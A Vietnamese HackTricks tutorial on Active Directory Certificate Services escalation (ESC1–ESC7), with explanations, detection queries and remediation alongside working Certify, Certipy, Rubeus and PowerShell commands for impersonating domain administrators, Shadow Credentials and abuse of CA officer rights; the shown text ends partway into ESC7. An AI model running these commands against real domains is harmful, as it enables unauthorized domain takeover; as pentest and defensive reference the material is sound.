# Leo thang trong domain AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Đây là bản tóm tắt các phần về kỹ thuật leo thang trong các bài viết:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Template chứng chỉ cấu hình sai - ESC1

### Giải thích

### Giải thích về template chứng chỉ cấu hình sai - ESC1

- **Enterprise CA cấp quyền đăng ký chứng chỉ cho người dùng có đặc quyền thấp.**
- **Không yêu cầu phê duyệt của quản lý.**
- **Không cần chữ ký của nhân sự có thẩm quyền.**
- **Các security descriptor trên template chứng chỉ quá dễ dãi, cho phép người dùng có đặc quyền thấp được cấp quyền đăng ký chứng chỉ.**
- **Template chứng chỉ được cấu hình để xác định EKU hỗ trợ xác thực:**
  - Bao gồm các định danh Extended Key Usage (EKU) như Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), hoặc không có EKU (SubCA).
- **Template cho phép người yêu cầu đưa subjectAltName vào Certificate Signing Request (CSR):**
  - Nếu chứng chỉ có subjectAltName (SAN), Active Directory (AD) sẽ ưu tiên SAN để xác minh danh tính. Điều này có nghĩa là bằng cách chỉ định SAN trong CSR, có thể yêu cầu chứng chỉ để giả mạo bất kỳ người dùng nào (ví dụ: quản trị viên domain). Khả năng người yêu cầu chỉ định SAN được thể hiện trong đối tượng AD của template chứng chỉ qua thuộc tính `mspki-certificate-name-flag`. Thuộc tính này là một bitmask; nếu có cờ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, người yêu cầu được phép chỉ định SAN.

> [!CAUTION]
> Các thiết lập này xác định một template ESC1 tiềm ẩn nguy cơ, chứ không chứng minh rằng đã có đường dẫn giả mạo hoàn chỉnh. Hãy kiểm tra principal mục tiêu có thể đăng ký trên CA đang phát hành template hay không, CA có cho phép đăng ký hay không và chứng chỉ được cấp có đáp ứng các quy tắc ánh xạ SID mạnh của endpoint xác thực hay không. KDC đã được vá hiện có thể từ chối UPN được yêu cầu nếu SID trong chứng chỉ không khớp với mục tiêu; xem [hướng dẫn ánh xạ chứng chỉ của Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Quyền đăng ký được cấp cho **Domain Computers** có thể khiến một danh tính máy tính được tạo sẵn đủ điều kiện đăng ký, ngay cả khi người dùng ban đầu không thể đăng ký. Hãy đánh giá riêng quyền của principal máy tính. Kiểm tra `msPKI-Minimal-Key-Size` trước khi gửi yêu cầu: template yêu cầu khóa RSA 4096-bit sẽ từ chối khóa mặc định 2048-bit của client. SID mục tiêu được cung cấp trong yêu cầu chỉ có thể khắc phục SID không khớp khi CA và KDC chấp nhận chứng chỉ và ánh xạ tương ứng; chỉ các cờ của template hoặc một ACE Enroll không đủ để chứng minh điều đó.

Tính năng này đôi khi được bật để hỗ trợ việc tạo chứng chỉ HTTPS hoặc chứng chỉ máy chủ tức thời bởi sản phẩm hay dịch vụ triển khai, hoặc do thiếu hiểu biết.

Lưu ý rằng việc tạo chứng chỉ với tùy chọn này sẽ kích hoạt cảnh báo. Tuy nhiên, cảnh báo sẽ không xuất hiện khi một template chứng chỉ có sẵn (chẳng hạn template `WebServer`, vốn đã bật `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) được sao chép rồi chỉnh sửa để thêm OID xác thực.<sup>[[6]](#references)</sup>

### Khai thác

Để **tìm các template chứng chỉ dễ bị tấn công**, bạn có thể chạy:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Để **khai thác lỗ hổng này nhằm mạo danh quản trị viên**, có thể chạy:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Sau đó, bạn có thể chuyển đổi **certificate đã tạo sang định dạng `.pfx`** và dùng nó để **xác thực bằng Rubeus hoặc certipy** lần nữa:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Các binary của Windows "Certreq.exe" và "Certutil.exe" có thể được dùng để tạo PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Có thể liệt kê các certificate template trong schema cấu hình của AD Forest, cụ thể là những template không yêu cầu phê duyệt hoặc chữ ký, có EKU Client Authentication hoặc Smart Card Logon và bật flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, bằng cách chạy truy vấn LDAP sau:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### Giải thích

Kịch bản lạm dụng thứ hai là một biến thể của kịch bản đầu tiên:

1. Enterprise CA cấp quyền đăng ký cho người dùng có đặc quyền thấp.
2. Tắt yêu cầu phê duyệt của quản lý.
3. Bỏ qua yêu cầu về chữ ký được ủy quyền.
4. Bộ mô tả bảo mật quá dễ dãi trên mẫu chứng chỉ cấp quyền đăng ký chứng chỉ cho người dùng có đặc quyền thấp.
5. **Mẫu chứng chỉ được cấu hình để bao gồm EKU Any Purpose hoặc không có EKU.**

**EKU Any Purpose** cho phép kẻ tấn công lấy chứng chỉ cho **bất kỳ mục đích nào**, bao gồm xác thực máy khách, xác thực máy chủ, ký mã, v.v. Có thể sử dụng **kỹ thuật tương tự như kỹ thuật dùng cho ESC3** để khai thác kịch bản này.

Chứng chỉ **không có EKU**, vốn hoạt động như chứng chỉ CA cấp dưới, có thể bị khai thác cho **bất kỳ mục đích nào** và **cũng có thể dùng để ký chứng chỉ mới**. Do đó, kẻ tấn công có thể chỉ định EKU hoặc trường tùy ý trong chứng chỉ mới bằng cách sử dụng chứng chỉ CA cấp dưới.

Tuy nhiên, chứng chỉ mới được tạo để **xác thực miền** sẽ không hoạt động nếu CA cấp dưới không được đối tượng **`NTAuthCertificates`** tin cậy, đây là thiết lập mặc định. Dù vậy, kẻ tấn công vẫn có thể tạo **chứng chỉ mới với bất kỳ EKU nào** và các giá trị chứng chỉ tùy ý. Những chứng chỉ này có thể bị **lạm dụng** cho nhiều mục đích khác nhau (ví dụ: ký mã, xác thực máy chủ, v.v.) và có thể gây ảnh hưởng đáng kể đến các ứng dụng khác trong mạng như SAML, AD FS hoặc IPSec.<sup>[[6]](#references)</sup>

Để liệt kê các mẫu phù hợp với kịch bản này trong lược đồ cấu hình của AD Forest, có thể chạy truy vấn LDAP sau:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Mẫu Enrollment Agent cấu hình sai - ESC3

### Giải thích

Tình huống này tương tự tình huống thứ nhất và thứ hai, nhưng **abuse** một **EKU khác** (Certificate Request Agent) và **2 template khác nhau** (do đó có 2 nhóm yêu cầu),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), được gọi là **Enrollment Agent** trong tài liệu của Microsoft, cho phép một principal **đăng ký** **certificate** thay mặt cho người dùng khác.

**“Enrollment agent”** đăng ký một **template** như vậy và dùng **certificate thu được để đồng ký CSR thay mặt cho người dùng khác**. Sau đó, agent **gửi** **CSR đã được đồng ký** đến CA, đăng ký một **template** **cho phép “đăng ký thay mặt”**, và CA trả về một **certificate thuộc về người dùng “khác”**.<sup>[[6]](#references)</sup>

**Yêu cầu 1:**

- Enterprise CA cấp quyền đăng ký cho người dùng có đặc quyền thấp.
- Bỏ qua yêu cầu phê duyệt của quản lý.
- Không yêu cầu chữ ký được ủy quyền.
- Security descriptor của certificate template quá rộng quyền, cấp quyền đăng ký cho người dùng có đặc quyền thấp.
- Certificate template bao gồm Certificate Request Agent EKU, cho phép yêu cầu certificate từ các template khác thay mặt cho principal khác.

**Yêu cầu 2:**

- Enterprise CA cấp quyền đăng ký cho người dùng có đặc quyền thấp.
- Bỏ qua bước phê duyệt của quản lý.
- Một template mục tiêu phiên bản 1 có thể chấp nhận enrollment agent mà không cần các kiểm soát issuance-policy chi tiết hơn; với phiên bản 2 trở lên, hãy đánh giá các yêu cầu phát hành application-policy và chữ ký được ủy quyền, thay vì loại trừ template chỉ dựa trên phiên bản.
- Một EKU được xác định trong certificate template cho phép xác thực miền.
- CA không áp dụng các giới hạn đối với enrollment agent.

Template mục tiêu cũng phải được CA đã chọn phát hành, cho phép tài khoản mục tiêu đăng ký và hỗ trợ mục đích xác thực miền. Kiểm tra các thuộc tính subject/SAN bắt buộc trên tài khoản đó; ví dụ, một template lấy email của subject từ AD sẽ không thể phát hành certificate cho tài khoản không có giá trị `mail` bắt buộc. Chỉ có certificate của agent thì chưa đáp ứng các điều kiện bắt buộc của template mục tiêu.

### Khai thác

Bạn có thể dùng [**Certify**](https://github.com/GhostPack/Certify) hoặc [**Certipy**](https://github.com/ly4k/Certipy) để abuse tình huống này:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Những **người dùng** được phép **nhận** **chứng chỉ enrollment agent**, các template mà **agent** được phép đăng ký và các **tài khoản** mà enrollment agent có thể đại diện hành động đều có thể bị giới hạn bởi enterprise CA. Để thực hiện việc này, hãy mở snap-in `certsrc.msc`, **nhấp chuột phải vào CA**, **nhấp vào Properties**, rồi **điều hướng** đến tab “Enrollment Agents”.

Tuy nhiên, cần lưu ý rằng cài đặt **mặc định** của CA là “**Do not restrict enrollment agents**” (Không hạn chế enrollment agent). Khi quản trị viên bật giới hạn đối với enrollment agent bằng cách chọn “Restrict enrollment agents” (Giới hạn enrollment agent), cấu hình mặc định vẫn cực kỳ dễ dãi. Cấu hình này cho phép **Everyone** đăng ký mọi template với danh tính bất kỳ.

### PoC PowerShell chỉ dành cho Windows với Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) thực hiện ESC1 và ESC2/ESC3 mà không cần Certify hoặc Certipy. Các script của nó tạo khóa RSA 2048-bit có thể xuất bằng COM API `X509Enrollment`, dựng yêu cầu PKCS#10, tìm `pKIEnrollmentService` đầu tiên thông qua LDAP, gửi yêu cầu bằng `CertificateAuthority.Request`, cài đặt phản hồi vào `Cert:\CurrentUser\My` và xuất PFX được mã hóa Base64. Script ESC1 thêm SAN UPN do attacker chọn (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, giá trị `0xb`), trong khi các script ESC2/ESC3 dùng chứng chỉ đầu tiên để ký yêu cầu PKCS#7 thay mặt người khác.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Các script in ra Base64 của **PFX**, bao gồm private key, để dùng trực tiếp với Rubeus. Không thay thế bằng `[Convert]::ToBase64String($cert.RawData)`: `RawData` chỉ mã hóa public certificate và không thể ký yêu cầu PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Quyền kiểm soát truy cập vào mẫu chứng chỉ dễ bị tấn công - ESC4

### **Giải thích**

**Security descriptor** trên **certificate template** xác định các **quyền** mà những **AD principal** cụ thể có đối với mẫu.

Nếu **attacker** có đủ **quyền** để **thay đổi** một **template** và **thiết lập** bất kỳ **cấu hình sai có thể bị khai thác** nào được nêu trong **các phần trước**, thì có thể thực hiện leo thang đặc quyền.

Các quyền đáng chú ý áp dụng cho certificate template gồm:<sup>[[6]](#references)</sup>

- **Owner:** Cấp quyền kiểm soát ngầm đối với object, cho phép sửa đổi mọi thuộc tính.
- **FullControl:** Cấp toàn quyền đối với object, bao gồm khả năng sửa đổi mọi thuộc tính.
- **WriteOwner:** Cho phép thay đổi owner của object thành một principal do attacker kiểm soát.
- **WriteDacl:** Cho phép điều chỉnh quyền kiểm soát truy cập, có khả năng cấp FullControl cho attacker.
- **WriteProperty:** Cho phép chỉnh sửa mọi thuộc tính của object.

Ngoài ra, hãy kiểm tra DACL trên container `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Một ACE `CreateChild` áp dụng cho lớp [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), hoặc quyền kiểm soát toàn diện trên diện rộng, có thể cho phép tạo object template mới. [Microsoft có tài liệu](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) cho biết container này chứa các object template đó. Hãy kiểm tra các deny ACE khớp và cơ chế kế thừa trước khi xác định việc tạo object có hiệu lực hay không. Bản thân template được tạo không thể cấp chứng chỉ: CA phải publish template đó, principal gửi yêu cầu phải có quyền enrollment, và chứng chỉ phải ánh xạ đến danh tính dự kiến tại endpoint xác thực.

### Khai thác

Để xác định các principal có quyền chỉnh sửa template và các object PKI khác, hãy liệt kê bằng Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Một ví dụ về privesc tương tự ví dụ trước:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 xảy ra khi một người dùng có quyền ghi đối với một mẫu chứng chỉ. Chẳng hạn, có thể lợi dụng quyền này để ghi đè cấu hình của mẫu chứng chỉ, khiến mẫu dễ bị tấn công theo ESC1.

Một mẫu vốn cho phép người đăng ký cung cấp chủ thể nhưng chỉ có mục đích sử dụng Server Authentication thì tự nó không phải là mẫu đăng nhập người dùng. Nếu có quyền kiểm soát mẫu hiệu lực, kẻ tấn công có thể thay đổi các EKU xác thực hoặc application policy trước khi yêu cầu chứng chỉ; [Microsoft mô tả mục đích đăng nhập của EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Hãy xác minh rằng CA phát hành mẫu đã chỉnh sửa, người yêu cầu có thể đăng ký, các yêu cầu phê duyệt/chữ ký được đáp ứng và chứng chỉ được cấp ánh xạ tới đúng tài khoản. Đặc biệt, [các domain controller đã được vá ở chế độ Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) sẽ từ chối chứng chỉ không có ánh xạ mạnh; việc thêm UPN của mục tiêu vào yêu cầu không thể vượt qua yêu cầu đó.

Như chúng ta có thể thấy trong đường tấn công ở trên, chỉ `JOHNPC` có các quyền này, nhưng người dùng `JOHN` của chúng ta có edge `AddKeyCredentialLink` mới tới `JOHNPC`. Vì kỹ thuật này liên quan đến chứng chỉ, tôi cũng đã triển khai cuộc tấn công này, được gọi là [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Sau đây là một cái nhìn nhanh về lệnh `shadow auto` của Certipy để lấy NT hash của nạn nhân.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** có thể ghi đè cấu hình của một mẫu chứng chỉ chỉ bằng một lệnh. Theo **mặc định**, Certipy sẽ **ghi đè** cấu hình để khiến mẫu **dễ bị ESC1**. Ta cũng có thể chỉ định **tham số `-save-old` để lưu cấu hình cũ**, việc này sẽ hữu ích khi **khôi phục** cấu hình sau cuộc tấn công.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kiểm soát truy cập đối tượng PKI dễ bị tấn công - ESC5

### Giải thích

Mạng lưới rộng lớn gồm các mối quan hệ dựa trên ACL có liên kết với nhau, bao gồm nhiều đối tượng ngoài certificate template và certificate authority, có thể ảnh hưởng đến tính bảo mật của toàn bộ hệ thống AD CS. Những đối tượng này có thể ảnh hưởng đáng kể đến bảo mật, bao gồm:

- Đối tượng máy tính AD của máy chủ CA, có thể bị xâm phạm thông qua các cơ chế như S4U2Self hoặc S4U2Proxy.
- Máy chủ RPC/DCOM của máy chủ CA.
- Mọi đối tượng hoặc container AD hậu duệ nằm trong đường dẫn container cụ thể `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Đường dẫn này bao gồm, nhưng không giới hạn ở, các container và đối tượng như container Certificate Templates, container Certification Authorities, đối tượng NTAuthCertificates và Enrollment Services Container.

Hệ thống PKI có thể bị xâm phạm nếu một attacker có đặc quyền thấp chiếm quyền kiểm soát bất kỳ thành phần quan trọng nào trong số này.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Giải thích

Chủ đề được đề cập trong [**bài đăng của CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) cũng bàn đến các hệ quả của flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, như Microsoft đã nêu. Khi được kích hoạt trên Certification Authority (CA), cấu hình này cho phép đưa **các giá trị do người dùng xác định** vào **subject alternative name** cho **mọi yêu cầu**, bao gồm cả những yêu cầu được tạo từ Active Directory®. Do đó, tính năng này cho phép **intruder** đăng ký thông qua **bất kỳ template nào** được thiết lập cho **authentication** trong domain—cụ thể là các template cho phép người dùng **không có đặc quyền** đăng ký, chẳng hạn như template User mặc định. Nhờ vậy, có thể lấy được certificate cho phép intruder xác thực với tư cách domain administrator hoặc **bất kỳ thực thể nào khác đang hoạt động** trong domain.<sup>[[9]](#references)</sup>

**Lưu ý**: Cách thêm **alternative names** vào Certificate Signing Request (CSR) thông qua đối số `-attrib "SAN:"` trong `certreq.exe` (được gọi là “Name Value Pairs”) **khác biệt** với chiến lược khai thác SAN trong ESC1. Điểm khác biệt nằm ở **cách đóng gói thông tin tài khoản**—trong thuộc tính certificate thay vì trong extension.

### Khai thác

Để xác minh liệu cài đặt này đã được kích hoạt hay chưa, các tổ chức có thể sử dụng lệnh sau với `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Thao tác này về cơ bản sử dụng **remote registry access**, vì vậy một cách tiếp cận thay thế có thể là:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Các công cụ như [**Certify**](https://github.com/GhostPack/Certify) và [**Certipy**](https://github.com/ly4k/Certipy) có thể phát hiện cấu hình sai này và khai thác nó:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Để thay đổi các cài đặt này, giả sử có **quyền quản trị miền** hoặc quyền tương đương, có thể chạy lệnh sau từ bất kỳ máy trạm nào:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Để vô hiệu hóa cấu hình này trong môi trường của bạn, có thể xóa cờ bằng:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Sau các bản cập nhật bảo mật tháng 5 năm 2022, **certificates** mới được cấp sẽ chứa một **security extension** bao gồm thuộc tính `objectSid` của **người yêu cầu**. Với ESC1, SID này được suy ra từ SAN đã chỉ định. Tuy nhiên, với **ESC6**, SID phản ánh `objectSid` của **người yêu cầu**, chứ không phải SAN.\
> Để khai thác ESC6, hệ thống cần phải dễ bị tấn công bởi ESC10 (Weak Certificate Mappings), vốn ưu tiên **SAN hơn security extension mới**.

## Kiểm soát truy cập của Tổ chức phát hành chứng chỉ dễ bị tấn công - ESC7

### Tấn công 1

#### Giải thích

Kiểm soát truy cập đối với một certificate authority được duy trì thông qua một tập hợp quyền kiểm soát các hành động của CA. Có thể xem các quyền này bằng cách mở `certsrv.msc`, nhấp chuột phải vào một CA, chọn Properties, rồi chuyển đến tab Security. Ngoài ra, có thể liệt kê các quyền bằng module PSPKI với những lệnh như:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This cung cấp thông tin chi tiết về các quyền chính, cụ thể là **`ManageCA`** và **`ManageCertificates`**, lần lượt tương ứng với vai trò “quản trị viên CA” và “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuse

Quyền **`ManageCA`** trên một certificate authority cho phép principal thao túng từ xa các cài đặt bằng PSPKI. Việc này bao gồm bật/tắt cờ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** để cho phép chỉ định SAN trong bất kỳ template nào, một khía cạnh quan trọng của domain escalation.

Có thể đơn giản hóa quy trình này bằng cách sử dụng cmdlet **Enable-PolicyModuleFlag** của PSPKI, cho phép sửa đổi mà không cần tương tác trực tiếp với GUI.

Quyền **`ManageCertificates`** cho phép phê duyệt các yêu cầu đang chờ xử lý, qua đó vô hiệu hóa biện pháp bảo vệ “CA certificate manager approval”.

Có thể sử dụng kết hợp các module **Certify** và **PSPKI** để yêu cầu, phê duyệt và tải xuống certificate:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Giải thích

> [!WARNING]
> Trong **tấn công trước đó**, quyền **`Manage CA`** được dùng để **bật** cờ **EDITF_ATTRIBUTESUBJECTALTNAME2** nhằm thực hiện **tấn công ESC6**, nhưng việc này sẽ không có tác dụng cho đến khi dịch vụ CA (`CertSvc`) được khởi động lại. Khi người dùng có quyền truy cập `Manage CA`, họ cũng được phép **khởi động lại dịch vụ**. Tuy nhiên, điều đó **không có nghĩa là người dùng có thể khởi động lại dịch vụ từ xa**. Hơn nữa, **tấn công E**SC6 có thể không hoạt động ngay trong hầu hết các môi trường đã được vá, do các bản cập nhật bảo mật tháng 5 năm 2022.

Vì vậy, một cuộc tấn công khác được trình bày ở đây.

Điều kiện tiên quyết:

- Chỉ cần quyền **`ManageCA`**
- Quyền **`Manage Certificates`** (có thể được cấp từ **`ManageCA`**)
- Mẫu chứng chỉ **`SubCA`** phải được **bật** (có thể bật từ **`ManageCA`**)

Kỹ thuật này dựa trên thực tế là người dùng có quyền truy cập `Manage CA` _và_ `Manage Certificates` có thể **cấp các yêu cầu chứng chỉ không thành công**. Mẫu chứng chỉ **`SubCA`** **dễ bị tấn công ESC1**, nhưng **chỉ quản trị viên** mới có thể đăng ký mẫu này. Do đó, **người dùng** có thể **yêu cầu** đăng ký **`SubCA`** — yêu cầu sẽ bị **từ chối** — nhưng **sau đó được người quản lý cấp**.<sup>[[6]](#references)</sup>

#### Khai thác

Bạn có thể **tự cấp cho mình quyền truy cập `Manage Certificates`** bằng cách thêm người dùng của mình làm một officer mới.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Mẫu **`SubCA`** có thể được **bật trên CA** bằng tham số `-enable-template`. Theo mặc định, mẫu `SubCA` được bật.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Nếu chúng ta đã đáp ứng các điều kiện tiên quyết cho cuộc tấn công này, ta có thể bắt đầu bằng cách **yêu cầu một chứng chỉ dựa trên template `SubCA`**.

**Yêu cầu này sẽ bị từ chối**, nhưng chúng ta sẽ lưu khóa riêng và ghi lại request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Với **`Manage CA` và `Manage Certificates`**, sau đó chúng ta có thể **cấp yêu cầu chứng chỉ bị lỗi** bằng lệnh `ca` và tham số `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Và cuối cùng, chúng ta có thể **lấy chứng chỉ đã được cấp** bằng lệnh `req` cùng tham số `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Tấn công 3 – Lạm dụng phần mở rộng chứng chỉ Manage Certificates (SetExtension)

#### Giải thích

Ngoài các kiểu lạm dụng ESC7 cổ điển (bật thuộc tính EDITF hoặc phê duyệt yêu cầu đang chờ), **Certify 2.0** đã tiết lộ một primitive hoàn toàn mới, chỉ yêu cầu vai trò *Manage Certificates* (còn gọi là **Certificate Manager / Officer**) trên Enterprise CA.<sup>[[3]](#references)</sup>

Bất kỳ principal nào có quyền *Manage Certificates* đều có thể thực thi phương thức RPC `ICertAdmin::SetExtension`. Trước đây, các CA hợp pháp thường dùng phương thức này để cập nhật phần mở rộng trên các yêu cầu **đang chờ**; tuy nhiên, kẻ tấn công có thể lạm dụng nó để **thêm một phần mở rộng chứng chỉ *không mặc định*** (ví dụ: một OID *Certificate Issuance Policy* tùy chỉnh như `1.1.1.1`) vào yêu cầu đang chờ phê duyệt.

